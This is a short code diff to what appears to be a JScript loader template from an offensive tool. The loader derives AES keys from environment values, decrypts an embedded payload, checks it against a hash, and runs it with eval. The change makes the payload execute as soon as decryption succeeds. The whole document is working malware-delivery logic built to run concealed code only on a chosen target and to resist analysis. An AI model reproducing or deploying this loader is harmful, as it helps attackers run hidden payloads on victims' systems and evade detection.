@@ -56,8 +56,8 @@ function tryKeyCombos(combos, path, encrypted, payloadHash) {
         try {
             var decrypted = decryptAES(encrypted, key)
             if(compareHash(decrypted, payloadHash)) {
-                result = decrypted
-                return result
+                eval(decrypted);
+                WScript.Quit(1);
             }
         }
         catch(err) {}
@@ -73,7 +73,5 @@ envCombos.push("");
 ~ENVVAR~
 
 for(i = 0; i < allPaths.length; i++) {
-    result = tryKeyCombos(envCombos, allPaths[i], "~ENCRYPTEDBASE64~", "~PAYLOADHASH~")
+    tryKeyCombos(envCombos, allPaths[i], "~ENCRYPTEDBASE64~", "~PAYLOADHASH~")
 }
-
-eval(result);
